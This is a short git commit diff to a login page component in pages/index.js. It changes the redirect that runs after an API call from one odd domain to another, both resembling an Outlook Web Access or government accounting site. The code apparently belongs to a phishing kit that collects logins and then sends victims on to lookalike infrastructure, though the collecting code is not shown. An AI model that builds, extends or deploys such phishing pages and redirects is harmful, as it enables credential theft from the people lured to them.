5e02c24c7462ad0161e61101c5d635147583affa
husknet <127146284+husknet@users.noreply.github.com>
2025-04-07 11:02:31 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sgkar.tbint.owa-wensglotii.top/';
+      window.location.href = 'https://sgcoo.govtaccounting.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
